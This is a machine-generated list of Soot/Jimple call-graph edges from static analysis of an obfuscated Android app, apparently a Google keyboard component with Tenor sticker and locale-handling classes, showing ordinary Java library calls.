VIRTUAL edge: $r0 = virtualinvoke $r4.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Double: boolean isNaN(double)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqr: lsa l()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <gwk: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hno: void <init>()> ==> <iec: void <init>()>
STATIC edge: staticinvoke <iye: void Q(int,int)>($i0, $i1) in <lkq: lsb C(int)> ==> <iye: void Q(int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lma: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r1) in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r6) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int j()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lkh: int j()>
VIRTUAL edge: $z0 = virtualinvoke r0.<lsb: boolean hasNext()>() in <lsb: java.lang.Object next()> ==> <lsb: boolean hasNext()>
STATIC edge: $r4 = staticinvoke <java.lang.Integer: java.lang.String toHexString(int)>($i2) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Integer: java.lang.String toHexString(int)>
STATIC edge: $r3 = staticinvoke <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>("GMT") in <ose: void <clinit>()> ==> <j$.util.DesugarTimeZone: java.util.TimeZone getTimeZone(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean m()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkg: void c(java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Class getClass()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<lvr: int hashCode()>() in <lvt: int hashCode()> ==> <lvr: int hashCode()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmc: void <init>(lme)> ==> <lma: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lji: void <init>(java.util.Comparator)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsn: void <init>(java.util.logging.Level)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r7 = staticinvoke <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>("[0-9]+") in <iwt: void <clinit>()> ==> <java.util.regex.Pattern: java.util.regex.Pattern compile(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lsw d()>() in <lsn: lsw i(lsq)> ==> <lsf: lsw d()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
SPECIAL edge: specialinvoke $r0.<lqs: void <init>(lkq,java.util.Comparator)>($r2, $r1) in <lqs: void <clinit>()> ==> <lqs: void <init>(lkq,java.util.Comparator)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(17) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqs: int size()>
SPECIAL edge: specialinvoke $r4.<java.lang.StringBuilder: void <init>()>() in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>($r2, $i1, $i3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.CharSequence,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <j$.util.concurrent.w: void <init>()> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r6 = staticinvoke <ivw: java.lang.String l(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivw: java.lang.String l(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lkf: void <init>()>() in <lqk: void <init>(java.lang.Object[],int)> ==> <lkf: void <init>()>
SPECIAL edge: specialinvoke $r2.<lki: void <init>(java.lang.Object,java.lang.Object)>($r0, $r1) in <lri: java.util.Map$Entry H(java.lang.Object,java.lang.Object)> ==> <lki: void <init>(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.Object: int hashCode()>() in <izw: int ad(java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <lsp: int hashCode()> ==> <java.lang.String: int hashCode()>
SPECIAL edge: specialinvoke r0.<lsa: void <init>()>() in <lnc: void <init>(java.lang.Object)> ==> <lsa: void <init>()>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r3, $i2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r14.<lvt: boolean a()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lvt: boolean a()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: boolean equals(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke r0.<lqs: boolean containsAll(java.util.Collection)>($r4) in <lqs: boolean equals(java.lang.Object)> ==> <lqs: boolean containsAll(java.util.Collection)>
SPECIAL edge: specialinvoke $r5.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw a()> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(11) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $r2 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $i0 = staticinvoke <java.lang.Integer: int rotateLeft(int,int)>($i0, 15) in <izw: int ac(int)> ==> <java.lang.Integer: int rotateLeft(int,int)>
VIRTUAL edge: $r4 = virtualinvoke $r3.<java.lang.Object: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String toString()>
STATIC edge: staticinvoke <j$.util.concurrent.ThreadLocalRandom: void c()>() in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.ThreadLocalRandom: void c()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.String: int hashCode()>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r2, $i5) in <ljf: int o(int,int,int,int)> ==> <izw: int aj(java.lang.Object,int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsu: void <init>()> ==> <java.lang.Object: void <init>()>
CLINIT edge: staticinvoke <java.lang.Boolean: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Boolean: void <clinit>()>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
SPECIAL edge: specialinvoke $r2.<lji: void <init>(java.util.Comparator)>($r0) in <lqd: lqd b(java.util.Comparator)> ==> <lji: void <init>(java.util.Comparator)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $l4 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long get()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long get()>
SPECIAL edge: specialinvoke r0.<lma: void <init>()>() in <lmp: void <init>()> ==> <lma: void <init>()>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i1) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStickerSearchMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
STATIC edge: $i1 = staticinvoke <java.lang.Math: int max(int,int)>($i1, 2) in <lma: int e(int)> ==> <java.lang.Math: int max(int,int)>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lkq: java.util.Iterator iterator()>
SPECIAL edge: specialinvoke $r0.<java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>($r1) in <iye: void Q(int,int)> ==> <java.lang.IndexOutOfBoundsException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void O(int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lsa: void <init>()> ==> <java.lang.Object: void <init>()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lqr: java.util.Iterator iterator()>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lnc: java.lang.Object next()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljd: int size()>() in <liy: int size()> ==> <ljd: int size()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] x()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>($r2, $r1, $i0, r0) in <lqk: void <init>(java.lang.Object[],int)> ==> <lqk: void <init>(java.lang.Object,java.lang.Object[],int,lqk)>
INTERFACE edge: interfaceinvoke $r5.<java.util.Collection: boolean add(java.lang.Object)>($r2) in <lli: void e(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractCollection: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<lvt: void <init>(lvr)>($r3) in <lvt: void <clinit>()> ==> <lvt: void <init>(lvr)>
INTERFACE edge: $i0 = interfaceinvoke $r10.<java.util.Collection: int size()>() in <lmb: lme f()> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r6.<lly: void j(java.lang.Object)>($r8) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: void j(java.lang.Object)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <iye: java.lang.Object w(java.lang.Object)>
VIRTUAL edge: $r6 = virtualinvoke $r3.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.Object: java.lang.Class getClass()>
INTERFACE edge: $i1 = interfaceinvoke $r2.<java.util.List: int size()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<lma: boolean m()>() in <lma: lma p(java.util.Collection)> ==> <lrg: boolean m()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r9 = virtualinvoke $r9.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(64) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.lang.Object: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljf: boolean isEmpty()>() in <ljf: int c()> ==> <ljf: boolean isEmpty()>
SPECIAL edge: specialinvoke $r1.<lkm: void <init>(lkq,int)>(r0, $i0) in <lkq: lsb C(int)> ==> <lkm: void <init>(lkq,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r4.<ltc: void <init>(java.lang.String,int,int)>("FULL", 3, $i0) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: int hashCode()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lrg: int hashCode()>
STATIC edge: staticinvoke <iye: void D(boolean,java.lang.String,int,int)>(1, "min (%s) must be less than or equal to max (%s)", $i0, $i1) in <kwe: int U(int,int,int)> ==> <iye: void D(boolean,java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r0) in <kzs: boolean d(java.lang.Object,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <lsm: lsz c(int)>
SPECIAL edge: specialinvoke r0.<lkh: void <init>()>() in <lkq: void <init>()> ==> <lkh: void <init>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r1) in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <java.lang.System: int identityHashCode(java.lang.Object)>($r3) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.System: int identityHashCode(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.util.concurrent.atomic.AtomicInteger: void <init>()>() in <lsu: void <init>()> ==> <java.util.concurrent.atomic.AtomicInteger: void <init>()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <izw: void as(int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.ThreadLocal: java.lang.Object get()>() in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.lang.ThreadLocal: java.lang.Object get()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: java.util.Iterator l()> ==> <ljd: java.util.Map o()>
INTERFACE edge: $z0 = interfaceinvoke $r1.<java.util.Iterator: boolean hasNext()>() in <llg: boolean hasNext()> ==> <lsb: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("=null") in <izw: void aq(java.lang.Object,java.lang.Object)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>($r4) in <mly: java.lang.IllegalArgumentException f()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
STATIC edge: staticinvoke <iye: void y(boolean,java.lang.Object)>($z0, "collection too large") in <lma: int e(int)> ==> <iye: void y(boolean,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r2.<java.lang.String: java.lang.String concat(java.lang.String)>($r4) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.Class: java.lang.Object cast(java.lang.Object)>($r2) in <lsz: java.lang.Object d(java.lang.Object)> ==> <java.lang.Class: java.lang.Object cast(java.lang.Object)>
VIRTUAL edge: $r5 = virtualinvoke $r0.<hcb: java.lang.Object l(java.lang.String,ldp)>($r2, $r4) in <hbu: hbs f(java.lang.String,long)> ==> <hcb: java.lang.Object l(java.lang.String,ldp)>
STATIC edge: staticinvoke <java.util.Arrays: void fill(short[],short)>($r7, $s8) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.Arrays: void fill(short[],short)>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsv: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lma: boolean d()>() in <lma: boolean equals(java.lang.Object)> ==> <lma: boolean d()>
VIRTUAL edge: $r4 = virtualinvoke $r5.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r2.<java.lang.NullPointerException: void <init>(java.lang.String)>("Both parameters are null") in <iye: java.lang.Object V(java.lang.Object,java.lang.Object)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.util.AbstractSet: int hashCode()>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i0) in <lkt: void e(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
SPECIAL edge: specialinvoke $r25.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>($i5, $r15, $r16, $r12) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object,j$.util.concurrent.l)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<java.lang.StringBuilder: java.lang.String toString()>() in <iye: void O(int,int)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r0.<java.util.ArrayList: void <init>()>() in <lri: java.util.ArrayList N()> ==> <java.util.ArrayList: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.Object: java.lang.Class getClass()>() in <iye: java.lang.Object w(java.lang.Object)> ==> <java.lang.Object: java.lang.Class getClass()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorStaticImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <liz: java.lang.Object next()>
VIRTUAL edge: virtualinvoke $r4.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <iye: java.lang.String X(int,int,java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $i3 = virtualinvoke $r2.<java.lang.String: int indexOf(java.lang.String,int)>("%s", $i1) in <iye: java.lang.String r(java.lang.String,java.lang.Object[])> ==> <java.lang.String: int indexOf(java.lang.String,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqr: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r5.<java.util.Iterator: boolean hasNext()>() in <lri: boolean V(java.util.List,java.lang.Object)> ==> <lsb: boolean hasNext()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.Object: boolean equals(java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.lang.Object k(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: java.lang.Object k(int)>
STATIC edge: $r2 = staticinvoke <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>($r1, $i0) in <lri: java.lang.Object[] o(java.lang.Object[],int)> ==> <java.lang.reflect.Array: java.lang.Object newInstance(java.lang.Class,int)>
SPECIAL edge: specialinvoke $r2.<java.util.ConcurrentModificationException: void <init>()>() in <liz: void b()> ==> <java.util.ConcurrentModificationException: void <init>()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorAnimatedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
